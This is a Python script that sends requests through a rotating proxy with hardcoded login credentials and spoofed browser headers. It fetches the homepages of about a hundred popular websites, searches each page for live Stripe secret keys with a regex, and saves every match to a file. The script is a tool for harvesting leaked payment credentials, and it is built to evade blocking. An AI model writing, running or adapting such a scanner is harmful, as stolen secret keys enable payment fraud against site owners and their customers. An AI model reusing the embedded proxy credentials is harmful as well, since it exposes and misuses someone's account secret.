import requests
from bs4 import BeautifulSoup
import re
import time
import random
from urllib.parse import urljoin, urlparse

# Proxy configuration
PROXY = "http://iekqsuzp-rotate:q5zrpgr2jx5g@p.webshare.io:80/"

# Headers for web scraping
def get_headers():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.18362',
    ]
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

# Predefined list of popular websites
def get_predefined_websites():
    return [
        "https://www.shopify.com",
        "https://www.patreon.com",
        "https://www.kickstarter.com",
        "https://www.gofundme.com",
        "https://www.squarespace.com",
        "https://www.bigcommerce.com",
        "https://www.woocommerce.com",
        "https://www.wix.com",
        "https://www.weebly.com",
        "https://www.etsy.com",
        "https://www.stripe.com",
        "https://www.udemy.com",
        "https://www.coursera.org",
        "https://www.lynda.com",
        "https://www.skillshare.com",
        "https://www.twitch.tv",
        "https://www.github.com",
        "https://www.gitlab.com",
        "https://www.bitbucket.org",
        "https://www.digitalocean.com",
        "https://www.linode.com",
        "https://www.heroku.com",
        "https://www.netlify.com",
        "https://www.vercel.com",
        "https://www.ghost.org",
        "https://www.mojang.com",
        "https://www.jetbrains.com",
        "https://www.3dcart.com",
        "https://www.squarespace.com",
        "https://www.vendasta.com",
        "https://www.hellosign.com",
        "https://www.docusign.com",
        "https://www.hubspot.com",
        "https://www.salesforce.com",
        "https://www.pipedrive.com",
        "https://www.freshworks.com",
        "https://www.zoho.com",
        "https://www.asana.com",
        "https://www.trello.com",
        "https://www.monday.com",
        "https://www.smartsheet.com",
        "https://www.airtable.com",
        "https://www.wrike.com",
        "https://www.clickup.com",
        "https://www.slack.com",
        "https://www.msteams.com",
        "https://www.discord.com",
        "https://www.zoom.us",
        "https://www.skype.com",
        "https://www.gotomeeting.com",
        "https://www.bluejeans.com",
        "https://www.join.me",
        "https://www.cisco.com",
        "https://www.webex.com",
        "https://www.adobe.com",
        "https://www.autodesk.com",
        "https://www.corel.com",
        "https://www.zbrush.com",
        "https://www.photoshop.com",
        "https://www.illustrator.com",
        "https://www.autocad.com",
        "https://www.rhino3d.com",
        "https://www.sketchup.com",
        "https://www.blender.org",
        "https://www.unity3d.com",
        "https://www.unrealengine.com",
        "https://www.godotengine.org",
        "https://www.construct.net",
        "https://www.gamefroot.com",
        "https://www.stencyl.com",
        "https://www.gamemaker.io",
        "https://www.defold.com",
        "https://www.roblox.com",
        "https://www.minecraft.net",
        "https://www.epicgames.com",
        "https://www.steampowered.com",
        "https://www.gog.com",
        "https://www.origin.com",
        "https://www.uplay.com",
        "https://www.battle.net",
        "https://www.leagueoflegends.com",
        "https://www.valorant.com",
        "https://www.fortnite.com",
        "https://www.apexlegends.com",
        "https://www.pubg.com",
        "https://www.dota2.com",
        "https://www.worldofwarcraft.com",
        "https://www.starcraft2.com",
        "https://www.hearthstone.com",
        "https://www.diablo.com",
        "https://www.callofduty.com",
        "https://www.cyberpunk.net",
        "https://www.thewitcher.com",
        "https://www.reddeadonline.com",
        "https://www.gta5-mods.com",
        "https://www.nexusmods.com",
        "https://www.moddb.com",
        "https://www.twitch.tv",
        "https://www.youtube.com",
        "https://www.vimeo.com",
        "https://www.dailymotion.com",
        "https://www.hulu.com",
        "https://www.netflix.com",
        "https://www.disneyplus.com",
        "https://www.hbomax.com",
        "https://www.apple.com/apple-tv-plus",
        "https://www.amazon.com/prime-video",
    ]

# Scrape content and find sk_live keys
def fetch_page_content(url, session, retries=3):
    for attempt in range(retries):
        try:
            response = session.get(url, headers=get_headers(), proxies={"http": PROXY, "https": PROXY})
            if response.status_code == 200:
                return response.text
            else:
                print(f"Failed to access {url} on attempt {attempt + 1}: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error accessing {url} on attempt {attempt + 1}: {e}")
        time.sleep(2)
    return None

def find_stripe_keys(html_content):
    return re.findall(r'sk_live_[a-zA-Z0-9]{24}', html_content)

def main():
    # Step 1: Fetch websites mentioning Stripe
    stripe_websites_file = 'stripe_websites.txt'
    stripe_websites = get_predefined_websites()
    
    with open(stripe_websites_file, 'w') as file:
        for website in stripe_websites:
            file.write(f"{website}\n")
    
    print(f"Fetched {len(stripe_websites)} websites mentioning Stripe.")
    
    # Step 2: Scrape each website for sk_live keys
    stripe_keys_file = 'stripe_keys.txt'
    with requests.Session() as session:
        for url in stripe_websites:
            html_content = fetch_page_content(url, session)
            if html_content:
                keys = find_stripe_keys(html_content)
                if keys:
                    with open(stripe_keys_file, 'a') as file:
                        for key in keys:
                            file.write(f"{key}\n")
            time.sleep(2)  # Adding delay to avoid being blocked
    
    print(f"Completed scraping. Check {stripe_keys_file} for Stripe keys.")

if __name__ == "__main__":
    main()
